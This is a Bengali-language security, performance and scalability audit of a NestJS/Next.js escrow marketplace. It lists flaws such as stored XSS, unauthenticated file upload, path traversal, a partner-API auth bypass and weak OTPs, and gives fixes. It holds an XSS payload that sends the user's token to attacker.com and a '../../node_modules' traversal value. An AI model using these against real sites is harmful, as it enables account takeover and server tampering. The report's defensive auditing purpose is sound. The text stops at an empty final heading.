# সম্পূর্ণ Website Code Audit Report
**প্রজেক্ট নাম:** SafnexBD (Safe Transaction Marketplace & Digital/Physical Product Platform)  
**অডিট প্রকার:** Advanced Code, Security, Performance, Database & Scalability Audit  
**প্রস্তুতকারক:** Senior Software Architect, Application Security Engineer & Performance Architect  
**তারিখ:** ১৯ সেপ্টেম্বর, ২০২৬  
**স্কেল টার্গেট:** ১,০০০,০০০+ রেজিস্টার্ড ইউজার, ১০০,০০০+ কনকারেন্ট অ্যাক্টিভ ইউজার, ১০,০০০+ RPS (Requests Per Second)

---

## 1. Executive Summary

SafnexBD প্রজেক্টটির সম্পূর্ণ সোর্স কোড (Frontend, Backend, Database Schema, Realtime WebSocket, Partner API, Financial Engine) গভীরভাবে পর্যালোচনা (Static Code Inspection) করা হয়েছে। প্রজেক্টটির আর্কিটেকচারাল ভিত্তি, ডোমেইন মডেলিং এবং ফিন্যান্সিয়াল লেজার ডিজাইন প্রশংসনীয় হলেও, ভবিষ্যতে **১ মিলিয়ন (১০ লাখ) ইউজার** এবং **১ লাখ কনকারেন্ট ট্রাফিক** হ্যান্ডেল করার ক্ষেত্রে বেশ কিছু গুরুতর সিকিউরিটি ত্রুটি, ডাটাবেজ বটলনেক এবং কনকারেন্সি সীমাবদ্ধতা রয়েছে।

### সংক্ষেপিত অডিট ফলাফল:
* **Overall Architecture (সার্বিক আর্কিটেকচার):** মনোলিথিক NestJS ১১ (Node.js/Express) + Next.js ১৬ (React ১৯) App Router এবং Prisma ৬ + MySQL। কোডের মডুলার বিন্যাস ভালো হলেও এটি বর্তমানে **Single-Instance Bound** (অর্থাৎ ফাইল লোকাল ডিস্কে সেভ হয় এবং সকেট মেমোরিতে থাকে, ফলে সহজে একাধিক সার্ভারে অনুভূমিকভাবে স্কেল বা Horizontal Scale করা সম্ভব নয়)।
* **Security Status (নিরাপত্তা অবস্থা):** **CRITICAL RISK (উচ্চ ঝুঁকিপূর্ণ)**। 
  ১. প্রোডাক্ট ডেসক্রিপশনে কোনো স্যানিটাইজেশন ছাড়াই `dangerouslySetInnerHTML` ব্যবহারের কারণে **Stored XSS** রয়েছে যা দিয়ে ইউজারের JWT টোকেন চুরি সম্ভব।  
  ২. `/api/v1/uploads` এন্ডপয়েন্টটি সম্পূর্ণ পাবলিক এবং অথেন্টিকেশনহীন; সাথে আনস্যানিটাইজড ফোল্ডার পাথের কারণে **Directory Traversal** এবং যে কোনো এক্সটেনশনের ফাইল আপলোডের ঝুঁকি রয়েছে।  
  ৩. Partner API-তে সিগনেচার হেডার বাদ দিলে সিগনেচার ভেরিফিকেশন স্কিপ হয়ে যায় (**Auth Bypass**)।  
  ৪. কোনো এন্ডপয়েন্টেই রেট লিমিটিং (Rate Limiting) নেই।  
  ৫. WebSockets-এ কোনো টোকেন অথেন্টিকেশন নেই; যে কেউ যে কারো `userId` দিয়ে রুমে যুক্ত হয়ে প্রাইভেট মেসেজ ও অ্যাডমিন নোটিফিকেশন শুনতে পারে।
* **Performance Status (পারফরম্যান্স অবস্থা):** প্রতিটি অথেন্টিকেটেড রিকোয়েস্টে `JwtStrategy`-তে ৫টি টেবিল জয়েন করে ডাটাবেজ কোয়েরি চালানো হচ্ছে, যা ক্যাশিং ছাড়া প্রতি সেকেন্ডে হাজার হাজার রিকোয়েস্টে ডাটাবেজ ক্র্যাশ করাবে। প্রোডাক্ট সার্চে `LONGTEXT` ফিল্ডে `LIKE '%...%'` ব্যবহার করা হয়েছে যা ফুল টেবিল স্ক্যান তৈরি করে।
* **Database Status (ডাটাবেজ অবস্থা):** রিলেশনাল মডেলিং এবং `Decimal(18, 4)` এর ব্যবহার অত্যন্ত চমৎকার। কিন্তু কম্পোজিট ইনডেক্সের অভাব, আন-অপ্টিমাইজড `OFFSET` পেজিনেশন এবং অপটিমিস্টিক লকিংয়ের ত্রুটির কারণে কনকারেন্ট ট্রানজ্যাকশনে ডেটাবেজ ওভারলোড ও রেস কন্ডিশন হতে পারে।
* **Scalability Status (স্কেলেবিলিটি অবস্থা):** ক্যাশ লেয়ার (Redis) এবং ব্যাকগ্রাউন্ড কিউ (BullMQ) সম্পূর্ণ অনুপস্থিত। সমস্ত ইমেইল, এসএমএস ও নোটিফিকেশন সিঙ্ক্রোনাসলি (Synchronous) রিকোয়েস্টের ভেতর প্রসেস হচ্ছে।
* **1M User Readiness (১ মিলিয়ন ইউজার প্রস্তুতি):** **NOT READY (বর্তমান কোডবেস সরাসরি মিলিয়ন স্কেলের জন্য প্রস্তুত নয়)**। বড় ধরনের ক্র্যাশ ও পারফরম্যান্স বিপর্যয় এড়াতে আর্কিটেকচারাল রিফ্যাক্টরিং প্রয়োজন।

---

## 2. Project Architecture

SafnexBD প্ল্যাটফর্মটি একটি সেফ এসক্রো ট্রানজ্যাকশন মার্কেটপ্লেস এবং ডিজিটাল/ফিজিক্যাল প্রোডাক্ট ই-কমার্স সিস্টেম।

```
                       [CLIENT LAYER]
          Next.js 16 (React 19) App Router (SSR/CSR)
          Zustand Store + TanStack React Query + Axios
                             │
                             ▼ (HTTP REST / WebSocket)
                     [API GATEWAY / APP]
                  NestJS 11 Monolithic Backend
      ┌──────────────────────┼──────────────────────┐
      │                      │                      │
 [Auth & Users]     [Wallet & Ledger]     [Chat & Realtime]
 Passport JWT        Decimal Engine         Socket.io Server
 Class Validator     Audit Logs             In-Memory Rooms
      │                      │                      │
      └──────────────────────┼──────────────────────┘
                             ▼
                      [ORM / DATABASE]
                     Prisma ORM 6.19
                    MySQL 8.0+ Database
                             │
                             ▼
                    [LOCAL FILE STORAGE]
                   process.cwd()/uploads
```

### আর্কিটেকচারাল ফ্লো:
1. **Frontend:** Next.js 16 App Router ব্যবহার করে ক্লায়েন্ট ও সার্ভার কম্পোনেন্টের সমন্বয়ে পরিচালিত। API কলের জন্য Axios এবং গ্লোবাল সিঙ্ক ও ক্যাশিংয়ের জন্য TanStack Query ব্যবহৃত।
2. **Backend API:** NestJS 11 মডুলার আর্কিটেকচার। প্রায় ২০টি পৃথক ডোমেইন মডিউল (`auth`, `wallet`, `transactions`, `bids`, `chat`, `products`, `disputes`, `partner` ইত্যাদি) রয়েছে।
3. **Database Layer:** Prisma ORM এর মাধ্যমে MySQL ডাটাবেজের সাথে যোগাযোগ করে।
4. **Realtime Engine:** NestJS WebSockets (`@nestjs/websockets` ও `socket.io`) দিয়ে চ্যাট এবং নোটিফিকেশন ব্রডকাস্ট করা হয়।
5. **Storage:** সার্ভারের লোকাল ফাইলসিস্টেমে (`uploads/` ডিরেক্টরি) Base64 স্ট্রিং ডিকোড করে ফাইল ও ইমেজ সংরক্ষণ করা হয়।

---

## 3. Technology Stack

| Component | Current Technology | Version | 1M Scale Suitability |
| :--- | :--- | :--- | :--- |
| **Frontend Framework** | Next.js (React) | 16.3.5 / 19.2.8 | ✅ চমৎকার, কিন্তু ক্লায়েন্ট ক্যাশিং ও SSR অপ্টিমাইজেশন প্রয়োজন |
| **Backend Framework** | NestJS (Express) | 11.0.1 | ✅ স্কেলযোগ্য, তবে মাইক্রোসার্ভিস বা মডুলার ওয়াকার আর্কিটেকচার প্রয়োজন |
| **Programming Language** | TypeScript | 5.7.3 | ✅ টাইপ-সেফটি ও পারফরম্যান্সের জন্য উপযুক্ত |
| **Database** | MySQL | 8.0+ | ⚠️ ১ মিলিয়নের জন্য উপযুক্ত, তবে রিড-রেপ্লিকা ও পার্টিশনিং দরকার |
| **ORM** | Prisma ORM | 6.19.3 | ⚠️ জটিল কোয়েরিতে ওভারহেড তৈরি করে; কানেকশন পুলিং দরকার |
| **Cache System** | *None* | অনুপস্থিত | ❌ **বটলনেক:** Redis ক্যাশ ছাড়া ১০ হাজার RPS সম্ভব নয় |
| **Queue / Background Jobs** | *None* | অনুপস্থিত | ❌ **বটলনেক:** ইমেইল/এসএমএস রিকোয়েস্টের ভেতর ব্লক করে রাখে |
| **Realtime Engine** | Socket.io (In-Memory) | 4.8.3 | ❌ **বটলনেক:** মাল্টি-ইনস্ট্যান্সে কাজ করবে না (Redis Adapter নেই) |
| **File Storage** | Local Disk (Filesystem) | Native FS | ❌ **বটলনেক:** মাল্টিপল সার্ভারে ফাইল সিঙ্ক হবে না; S3/R2 প্রয়োজন |
| **Security / WAF** | *None* (No Rate Limiter)| অনুপস্থিত | ❌ **বটলনেক:** DDoS ও Brute-force এ সরাসরি সার্ভার ডাউন হবে |

---

## 4. Architecture Strengths

১. **মডুলার আর্কিটেকচার (Modular Architecture):** NestJS মডিউলগুলো ডোমেইন অনুযায়ী চমৎকারভাবে ভাগ করা (`wallet`, `transactions`, `bids`, `disputes`, `partner`)। ভবিষ্যতে কোনো মডিউলকে পৃথক সার্ভিসে রূপান্তর করা সহজ।  
২. **অবিচল ফিন্যান্সিয়াল লেজার (Immutable Financial Ledger):** `wallet_ledger` টেবিলে প্রতিটি ট্রানজ্যাকশনের `balanceBefore`, `balanceAfter`, `holdBefore`, `holdAfter` পুঙ্খানুপুঙ্খভাবে ট্র্যাক করা হয়েছে। ডাবল-এন্ট্রি বুককিপিংয়ের চমৎকার প্রতিফলন।  
৩. **নিখুঁত আর্থিক হিসাব (Decimal Precision):** জাভাস্ক্রিপ্টের ফ্লোটিং পয়েন্ট সমস্যার সমাধান করতে ডাটাবেজে `Decimal(18, 4)` এবং কোডে `Prisma.Decimal` ব্যবহার করা হয়েছে।  
৪. **অডিট ট্রেইল (Comprehensive Audit Logs):** অ্যাডমিন ও আর্থিক পরিবর্তনের জন্য `audit_logs` টেবিলে `beforeState`, `afterState`, এবং `reason` বাধ্যতামূলক রাখা হয়েছে।  
৫. **স্ট্রং ইনপুট ভ্যালিডেশন (DTO Validation):** `class-validator` ও `class-transformer` দিয়ে ব্যাকএন্ডে ইনপুটগুলো কঠোরভাবে টাইপচেক করা হচ্ছে (`whitelist: true`)।  
৬. **স্টেট মেশিন ডিজাইন (State Machine):** সেফ ট্রানজ্যাকশন ইঞ্জিনে প্রতিটি ধাপ (`REQUESTED` → `APPROVED` → `WORKING` → `WORK_COMPLETED` → `HOLD` → `RELEASED`) সুন্দরভাবে সংজ্ঞায়িত।

---

## 5. Architecture Weaknesses

১. **Single Point of Failure (SPOF):** সার্ভার ক্র্যাশ করলে চ্যাট, ট্রানজ্যাকশন, ব্যাকগ্রাউন্ড নোটিফিকেশন—সব একসাথে বন্ধ হয়ে যাবে।  
২. **Stateless Scalability-র অভাব:** লোকাল ডিস্কে ফাইল সেভ করা এবং সকেট কানেকশন মেমোরিতে রাখার কারণে একাধিক সার্ভার ইনস্ট্যান্স চালানো অসম্ভব।  
৩. **Synchronous Third-Party Processing:** SMS Gateway বা ইমেইল পাঠানোর সময় HTTP রিকোয়েস্ট আটকে থাকে।  
৪. **Missing Distributed Cache:** ডাটাবেজ থেকে বারংবার একই স্ট্যাটিক সেটিংস ও ইউজার প্রোফাইল ফেচ করা হয়।  
৫. **Tight Coupling:** চ্যাট গেটওয়ে সরাসরি কন্ট্রোলারের মধ্যে কল করা হচ্ছে, কোনো ইভেন্ট-ড্রিভেন আর্কিটেকচার (Event Emitter বা Redis Pub/Sub) নেই।

---

## 6. Backend Audit

### ক) Performance Issues (পারফরম্যান্স সমস্যা)
* **N+1 ও অতিরিক্ত জয়েন কোয়েরি (`jwt.strategy.ts`):**  
  প্রতিটি অথেন্টিকেটেড API রিকোয়েস্টে `validate()` মেথড কল হয়। সেখানে `prisma.user.findUnique` চালিয়ে `wallet`, `userRoles`, `role`, `permissions`, `permission`—এই ৫টি টেবিল প্রতি রিকোয়েস্টে জয়েন করে ডাটাবেজ থেকে রিড করা হচ্ছে।  
  *প্রভাব:* ১,০০০ রিকোয়েস্ট/সেকেন্ডে শুধুমাত্র ইউজারের টোকেন যাচাই করতেই ডাটাবেজে ১,০০০টি জটিল SQL জয়েন কোয়েরি এক্সিকিউট হবে!
* **সিঙ্ক্রোনাস নোটিফিকেশন (`wallet.service.ts`, `auth.service.ts`):**  
  রিচার্জ রিকোয়েস্ট বা রেজিস্ট্রেশনের সময় `chatGateway.notifyAdminsAndStaff` সরাসরি মূল এক্সিকিউশন চেইনে রান হয়। কোনো কারণে সকেটের ক্লায়েন্ট বেশি হলে ইভেন্ট লুপে ল্যাগ তৈরি হবে।
* **বিগইনট (BigInt) সিরিয়ালাইজেশন ওভারহেড:**  
  ফাইলের সাইজ `BigInt` হিসেবে থাকায় কোডের বিভিন্ন স্থানে `JSON.parse(JSON.stringify(..., (k, v) => typeof v === 'bigint' ? v.toString() : v))` চালানো হয়েছে। এটি প্রচুর মেমোরি ও CPU অপচয় করে।

### খ) Concurrency & Race Conditions (কনকারেন্সি ও রেস কন্ডিশন)
* **ভুয়া অপটিমিস্টিক লকিং (Fake Optimistic Locking):**  
  `Wallet` মডেলে `version Int @default(0)` ফিল্ড রয়েছে। কিন্তু `wallet.service.ts` বা `transactions.service.ts`-এ আপডেট করার সময় কোড লেখা হয়েছে:
  ```typescript
  await tx.wallet.update({
    where: { id: wallet.id }, // version চেক নেই!
    data: { availableBalance: balanceAfter, version: { increment: 1 } },
  });
  ```
  আসল অপটিমিস্টিক লকিং হতে হলে `where: { id: wallet.id, version: currentVersion }` হতে হতো। বর্তমান কোডে দুটি কনকারেন্ট রিকোয়েস্ট একসাথে এলে ব্যালেন্স ওভাররাইট হয়ে যাবে এবং রেস কন্ডিশন ঘটবে।
* **রেজিস্ট্রেশনে `while(true)` লুপ (`auth.service.ts` - `generateUniqueUserId`):**  
  ইউনিক ইউজার আইডি তৈরির জন্য ডাটাবেজে `findUnique` দিয়ে লুপ চালানো হয়। কনকারেন্টলি একাধিক ইউজার একই নাম দিয়ে রেজিস্ট্রেশন করলে রেস কন্ডিশন হয়ে ডাটাবেজে Unique Constraint Violation হবে এবং সার্ভার ৫00 এরর দেবে।

---

## 7. API Audit

### রিকোয়েস্ট ট্রাফিক বটলনেক বিশ্লেষণ (১,০০০ থেকে ১০,০০০ RPS):
১. **`GET /api/v1/products` (প্রোডাক্ট লিস্টিং ও সার্চ):**  
   *কোড:* `products.service.ts` (লাইন ৩২৬-৩৩২)  
   *সমস্যা:* সার্চের সময় `{ descriptionHtml: { contains: q } }` দেওয়া আছে। MySQL-এ `LONGTEXT` কলামে `LIKE '%query%'` চালানো মানে সম্পূর্ণ টেবিল ডিস্ক থেকে মেমোরিতে এনে স্ক্যান করা।  
   *১০,০০০ RPS-এ ফলাফল:* ডাটাবেজ সার্ভারের CPU ১০০% এ পৌঁছাবে, ডিস্ক I/O আটকে যাবে এবং সম্পূর্ণ সাইট টাইমআউট হয়ে যাবে।
২. **`GET /api/v1/wallet/ledger` ও `GET /api/v1/transactions/my` (পেজিনেশন বটলনেক):**  
   *সমস্যা:* `skip = (page - 1) * limit` এবং সাথে `count()` কোয়েরি।  
   *১০ লাখ রো-তে ফলাফল:* ইউজার যখন ৫০ নম্বর পেজে যাবে, MySQL-কে পূর্বের ১,০০০টি রো স্ক্যান করে ফেলে দিতে হবে। পেজ যত বাড়বে, রেসপন্স টাইম তত স্লো হবে।
৩. **রেসপন্স সাইজ ও ওভার-ফেচিং (Over-fetching):**  
   প্রোডাক্ট ও ট্রানজ্যাকশন API-গুলোতে সম্পূর্ণ রিলেশন অবজেক্ট (Seller, Images, PhysicalMeta, Category, Sender, Receiver) ফেরত দেওয়া হয়। ১ লাখ ইউজারের ক্ষেত্রে অপ্রয়োজনীয় ব্যান্ডউইথ খরচ হবে।

---

## 8. Database Audit

### ক) Missing Indexes (অনুপস্থিত ইনডেক্সসমূহ)
১. **`products` টেবিল:**  
   কোয়েরিতে ব্যবহৃত হয়: `where: { status: 'ACTIVE', deletedAt: null }, orderBy: { createdAt: 'desc' }`।  
   *ঘাটতি:* `(status, deletedAt, createdAt)` এর কোনো **Composite Index** নেই। ফলে MySQL-কে প্রতি কোয়েরিতে `Using where; Using filesort` করতে হচ্ছে।
২. **`wallet_ledger` টেবিল:**  
   ইউজারের হিস্ট্রি খোঁজা হয়: `where: { userId }, orderBy: { createdAt: 'desc' }`।  
   *ঘাটতি:* `(userId, createdAt)` এর কম্পোজিট ইনডেক্স নেই। আলাদা আলাদা সিঙ্গেল ইনডেক্স রয়েছে যা বড় টেবিলে স্লো।
৩. **`messages` টেবিল:**  
   চ্যাটের মেসেজ ফেচ করা হয়: `where: { conversationId }, orderBy: { createdAt: 'asc' }`।  
   *ঘাটতি:* `(conversationId, createdAt)` কম্পোজিট ইনডেক্স প্রয়োজন।

### খ) ডাটাবেজ স্কেলিং প্রজেকশন (১M, ১০M, ১০০M Rows)
* **১ মিলিয়ন রো-তে:**  
  `wallet_ledger` এবং `messages` টেবিলের সাইজ গিগাবাইটে পৌঁছাবে। ইনডেক্স রিকোয়ার্ড মেমোরি (Buffer Pool) ছাড়িয়ে গেলে ডিস্ক সোয়াপিং শুরু হবে।
* **১০ মিলিয়ন রো-তে:**  
  `products.descriptionHtml`-এ `LIKE` সার্চ এবং পেজিনেশনের `count()` কোয়েরি প্রতি ক্লিকে ৫-১৫ সেকেন্ড সময় নেবে।
* **১০০ মিলিয়ন রো-তে:**  
  টেবিল পার্টিশনিং (Partitioning) ও কোল্ড ডাটা আর্কাইভিং ছাড়া ডাটাবেজ ক্র্যাশ করবে।

---

## 9. Database Scalability Architecture

### ভবিষ্যৎ ১M স্কেলের জন্য প্রয়োজনীয় কৌশল (রেকমেন্ডেশন):
১. **Read/Write Splitting (রিড-রাইট পৃথকীকরণ):**  
   একটি MySQL Master নোড (শুধুমাত্র INSERT/UPDATE/DELETE এর জন্য) এবং একাধিক MySQL Read Replicas (GET রিকোয়েস্ট ও সার্চের জন্য) স্থাপন করা।
২. **Database Connection Pooling:**  
   ১০,০০০ কনকারেন্ট কানেকশন সরাসরি MySQL হ্যান্ডেল করতে পারে না। **ProxySQL** অথবা **Prisma Accelerate** কানেকশন পুলার ব্যবহার করতে হবে।
৩. **টেবিল পার্টিশনিং (Table Partitioning):**  
   `wallet_ledger`, `audit_logs` এবং `messages` টেবিলকে `createdAt` এর সাল/মাস অনুযায়ী Range Partitioning করা।
৪. **কোল্ড ডাটা সেপারেশন (Hot/Cold Data Archival):**  
   ৬ মাসের পুরোনো সম্পন্ন হওয়া ট্রানজ্যাকশন ও মেসেজ মূল ডাটাবেজ থেকে আর্কাইভে সরিয়ে নেওয়া।

---

## 10. Caching Analysis

### বর্তমান অবস্থা: শূন্য ক্যাশিং (Zero Caching)
প্রজেক্টে কোনো ক্যাশ লেয়ার নেই। প্রতি সেকেন্ডে আসা সমস্ত ট্রাফিক সরাসরি মূল MySQL ডাটাবেজে আঘাত করে।

### ক্যাশিং আর্কিটেকচার রেকমেন্ডেশন:
| ডাটার ধরণ | বর্তমান সমস্যা | প্রস্তাবিত ক্যাশ কৌশল (Redis) | মেয়াদ (TTL) |
| :--- | :--- | :--- | :--- |
| **JWT User Auth Data** | প্রতি রিকোয়েস্টে ৫-টেবিল জয়েন | `user:session:{userId}` | ১৫ মিনিট |
| **System & Bid Settings** | প্রতি ট্রানজ্যাকশন/হোমপেজে DB কল | `settings:bids`, `settings:home` | ১ ঘন্টা (বা Change Event) |
| **Homepage Top Products** | লাখ লাখ ভিজিটরে ডাটাবেজ লক | `products:home:featured` | ৫ মিনিট |
| **Category Tree & Menus** | প্রতি পেজ লোডে ডাটাবেজ কোয়েরি | `common:categories`, `common:menus` | ২৪ ঘন্টা |

---

## 11. Queue & Background Processing

### বর্তমান সমস্যা:
* ইউজার যখন টাকা উইথড্র বা পাসওয়ার্ড রিসেট রিকোয়েস্ট করে, তখন `OtpService` সরাসরি এসএমএস এপিআই (`SmsService`) কল করে। থার্ড পার্টি এসএমএস গেটওয়ে রেসপন্স করতে ৩ সেকেন্ড দেরি করলে ইউজারের ব্রাউজার ৩ সেকেন্ড ফ্রিজ হয়ে থাকে।
* ইমেজ আপলোড হলে প্রসেসিং সিঙ্ক্রোনাসলি হয়।

### রেকমেন্ডেশন (BullMQ + Redis Worker):
```
[HTTP Request] ──► [NestJS Controller] ──► [BullMQ Producer] ──► [Redis Queue]
                                                                        │
[Immediate HTTP 200 OK Response] ◄─────────────────────────────────────┘
                                                                        │
                                                                 (Async Worker)
                                                                        ▼
                                                         [Worker Process: Send SMS/Email]
```
* **কাজের ক্ষেত্র:** SMS পাঠানো, ইমেইল নোটিফিকেশন, অডিট লগ প্রসেসিং, ইমেজ রিসাইজিং/কম্প্রেশন, এবং মেয়াদোত্তীর্ণ OTP ক্লিনআপ।
* **সুবিধা:** মেইন থ্রেড মুক্ত থাকবে, সার্ভার রেসপন্স টাইম ২০ms-এ নেমে আসবে, এবং এসএমএস গেটওয়ে ডাউন থাকলে অটোমেটিক রিট্রাই (Retry with Exponential Backoff) হবে।

---

## 12. Performance Analysis

১. **CPU স্পাইক:**  
   `bcrypt.compare(dto.password, user.passwordHash)` একটি CPU-ইনটেনসিভ অপারেশন। একসাথে ১,০০০ ইউজার লগইন করার চেষ্টা করলে নোড.জেএস-এর লিবইউভি (libuv) থ্রেডপুল ব্যস্ত হয়ে পড়বে এবং অন্যান্য রিকোয়েস্ট কিউতে আটকে যাবে।
২. **মেমোরি স্পাইক (Memory Bloat):**  
   `main.ts`-এ `app.use(json({ limit: '50mb' }))` সেট করা। যদি ১০ জন ইউজার একসাথে ২৫MB করে ফাইল Base64 এ পাঠায়, মেমোরিতে একবারে ২৫০MB+ বাফার তৈরি হবে, যা V8 Garbage Collection-কে স্লো করে দেবে।
৩. **ইভেন্ট লুপ ব্লকিং:**  
   বড় অ্যারে ফিল্টারিং এবং চ্যাটে বিগইনট কনভার্সনের জন্য ব্যবহৃত রিকার্সিভ রিপ্লেসার ফাংশন ইভেন্ট লুপ ব্লক করতে পারে।

---

## 13. Memory & CPU Analysis

* **রিসোর্স লিক ঝুঁকি (Resource Leak):**  
  WebSocket গেটওয়েতে `client.join(...)` করা হয়, কিন্তু ক্লায়েন্ট ডিসকানেক্ট হলে মেমোরি থেকে রুম রেফারেন্স এবং সকেট অবজেক্ট ক্লিনআপের কোনো স্পষ্ট ট্র্যাকিং নেই। দীর্ঘ সময় সার্ভার চললে মেমোরি লিক হতে পারে।
* **V8 Heap Limit (1.4GB default):**  
  কনকারেন্ট ফাইল আপলোড এবং আন-প্যাজিনেটেড ডাটা ফেচিংয়ের কারণে নোড প্রসেস `JavaScript heap out of memory` এরর দিয়ে ক্র্যাশ করতে পারে।

---

## 14. Security Audit (OWASP Top 10 Mapping)

| Vulnerability | Severity | ফাইল ও অবস্থান | বর্ণনা |
| :--- | :--- | :--- | :--- |
| **Stored XSS** | **CRITICAL** | `backend/.../products.service.ts` & `frontend/.../products/[slug]/page.tsx` | প্রোডাক্টের `descriptionHtml` কোনো স্যানিটাইজেশন ছাড়াই ডাটাবেজে সংরক্ষণ ও ফ্রন্টএন্ডে রেন্ডার করা হয়। |
| **Arbitrary File Upload** | **CRITICAL** | `backend/src/uploads/uploads.controller.ts` | কোনো অথেন্টিকেশন ও এক্সটেনশন ভ্যালিডেশন ছাড়াই যে কোনো ফাইল লোকাল স্টোরেজে আপলোড করা যায়। |
| **Path Traversal** | **HIGH** | `backend/src/uploads/uploads.service.ts:29` | `path.join(this.uploadDir, folder)` এ `folder` প্যারামিটার আনস্যানিটাইজড। |
| **Auth Bypass (Partner API)**| **HIGH** | `backend/src/partner/partner.service.ts:225` | `if (signature)` চেক থাকায় সিগনেচার হেডার বাদ দিলে সিক্রেট ভেরিফিকেশন ছাড়াই রিকোয়েস্ট পাস হয়। |
| **Insecure Direct Object Reference (WebSocket)**| **HIGH** | `backend/src/chat/chat.gateway.ts:29` | টোকেন ছাড়াই শুধুমাত্র কোয়েরি প্যারামিটারে `userId` দিয়ে যে কারো ব্যক্তিগত মেসেজ রুমে যুক্ত হওয়া যায়। |
| **Hardcoded Secret Fallback** | **MEDIUM** | `auth.service.ts:247`, `jwt.strategy.ts:12` | `.env` মিসিং হলে হার্ডকোডেড ডিফল্ট সিক্রেট কি ব্যবহার করে টোকেন ভ্যালিডেট হয়। |
| **Weak PRNG (Predictable OTP)** | **MEDIUM** | `backend/src/sms/otp.service.ts:22` | ক্রিপ্টোগ্রাফিক্যালি আনসেফ `Math.random()` দিয়ে OTP তৈরি করা হয়। |

---

## 15. Authentication & Authorization

### ক) Stored XSS এর মাধ্যমে Account Takeover ঝুঁকি:
1. একজন আক্রমণকারী সেলার অ্যাকাউন্টে লগইন করে একটি প্রোডাক্ট তৈরি করে যার বর্ণনায় স্ক্রিপ্ট ঢুকিয়ে দেয়:
   ```html
   <img src=x onerror="fetch('https://attacker.com/steal?t='+localStorage.getItem('safnexbd_token'))">
   ```
2. সাধারণ ক্রেতা বা অ্যাডমিন যখনই প্রোডাক্টটি দেখতে যাবে, ফ্রন্টএন্ডের `dangerouslySetInnerHTML={{ __html: product.descriptionHtml }}` স্ক্রিপ্টটি এক্সিকিউট করবে।
3. ইউজারের JWT অ্যাক্সেস টোকেন এবং রিফ্রেশ টোকেন আক্রমণকারীর সার্ভারে চলে যাবে।
4. **প্রতিকার:** ব্যাকএন্ডে ইনপুটের সময় `sanitize-html` এবং ফ্রন্টএন্ডে রেন্ডার করার সময় `DOMPurify` ব্যবহার করতে হবে।

### খ) Refresh Token রোটেশন দুর্বলতা:
* `auth.service.ts`-এর `refreshTokens` ফাংশনে পাঠানো টোকেনের হ্যাশ ডাটাবেজের সাথে মেলানো হয় না। শুধুমাত্র `userId` দিয়ে প্রথম অ্যাক্টিভ টোকেনটি রিভোক করে দেওয়া হয়। একাধিক ডিভাইসে লগইন থাকলে এটি বিভ্রান্তি ও সিকিউরিটি হোল তৈরি করে।

---

## 16. API Security

* **রেট লিমিটিংয়ের অনুপস্থিতি (No Rate Limiting):**  
  `main.ts` বা কোনো কন্ট্রোলারে `@nestjs/throttler` নেই।  
  *ঝুঁকি:* `/api/v1/auth/login` এ ডিকশনারি অ্যাটাক চালিয়ে অ্যাকাউন্ট হ্যাক করা সম্ভব।
* **CORS Wildcard (`*`) WebSockets-এ:**  
  `chat.gateway.ts`-এ `cors: { origin: '*' }` দেওয়া। যে কোনো থার্ড পার্টি ক্ষতিকারক সাইট ইউজারের ব্রাউজার দিয়ে সকেট কানেকশন খুলতে পারে।
* **Excessive Data Exposure:**  
  বিভিন্ন API রেসপন্সে ইউজারের ইন্টারনাল আইডি, রোলস এবং সংবেদনশীল ফিল্ড এক্সপোজ হয়।

---

## 17. File Upload Security

### বিস্তারিত পরিদর্শন (`uploads.service.ts` ও `uploads.controller.ts`):
১. **পাবলিক অ্যাক্সেস:** `@Public()` ডেকোরেটর থাকায় লগইন না করেই ফাইল আপলোড করা যায়।  
২. **এক্সটেনশন স্পুফিং ও ম্যালিসিয়াস ফাইল:**  
   `const ext = path.extname(originalName)` সরাসরি ব্যবহার করা হয়েছে। কোনো এক্সটেনশন হোয়াইটলিস্ট (যেমন: `.jpg`, `.png`, `.pdf`) নেই। যে কেউ `.html`, `.svg`, `.exe`, বা `.sh` আপলোড করতে পারে।  
   যেহেতু `main.ts`-এ `/uploads` স্ট্যাটিক ফাইল হিসেবে সার্ভ করা হচ্ছে, আপলোড করা `.html` ফাইলে ব্রাউজার থেকে সরাসরি ঢুকলে ফিশিং পেজ বা Stored XSS স্ক্রিপ্ট রান হবে।  
৩. **পাথ ট্রাভার্সাল (Path Traversal):**  
   বডিতে `folder: "../../node_modules"` পাঠালে ফাইলটি সার্ভারের যে কোনো ডিরেক্টরিতে লিখে ফেলা সম্ভব।

---

## 18. Abuse / Account Security

১. **দুর্বল ওটিপি জেনারেশন:**  
   `Math.random()` সিউডো-র‍্যান্ডম হওয়ায় পর পর কিছু ওটিপি পর্যবেক্ষণ করে পরবর্তী ওটিপি অনুমান করা সম্ভব। `crypto.randomInt` ব্যবহার আবশ্যক।  
২. **ওটিপি ব্রুট-ফোর্স ডিফেন্স নেই:**  
   `verifyOtp` ফাংশনে ভুল ওটিপি দিলে কোনো কাউন্টার বৃদ্ধি পায় না বা অ্যাকাউন্ট লক হয় না। ৬ ডিজিটের ওটিপি ১০ লাখ ট্রাইয়ের মধ্যে অটোমেটেড স্ক্রিপ্ট দিয়ে ভেঙে ফেলা সম্ভব।  
৩. **এসএমএস পাম্পিং ফ্রড (SMS Pumping Abuse):**  
   রেজিস্ট্রেশন বা ওটিপি রিকোয়েস্টে আন্তর্জাতিক নাম্বারে এসএমএস পাঠিয়ে প্ল্যাটফর্মের ব্যালেন্স শেষ করে দেওয়ার ঝুঁকি রয়েছে (টেলকো ফ্রড)।

---

## 19. Traffic Spike & DDoS Resilience

যদি ট্রাফিক হঠাৎ **10x, 50x বা 100x** বৃদ্ধি পায়:

```
[Traffic Spike] ──► [No CDN/WAF] ──► [Single Node.js Process] ──► [Single MySQL DB]
                          │                         │                         │
                   (All hits pass)           (Event Loop Lag,          (Connection Pool
                                             Max 50MB JSON OOM)         Exhausted, 100% CPU)
                                                    │                         │
                                                    ▼                         ▼
                                            [SERVER CRASH]             [DATABASE LOCK]
```

* **বটলনেক ১ (প্রথমে ফেল করবে):** ডাটাবেজ কানেকশন পুল। একসাথে কয়েক হাজার কানেকশন এলে `Too many connections` এরর আসবে।  
* **বটলনেক ২ (দ্বিতীয়তে ফেল করবে):** নোড.জেএস ইভেন্ট লুপ। সিঙ্ক্রোনাস ক্রিপ্টো এবং মেমোরি বাফারিংয়ের কারণে CPU ১০০% হয়ে যাবে।  
* **প্রতিরোধ ব্যবস্থা:** Cloudflare WAF + CDN সামনে বসাতে হবে। স্ট্যাটিক ফাইল ক্যাশ করতে হবে এবং Nginx রিভার্স প্রক্সিতে রেট লিমিট বসাতে হবে।

---

## 20. Failure Point Analysis

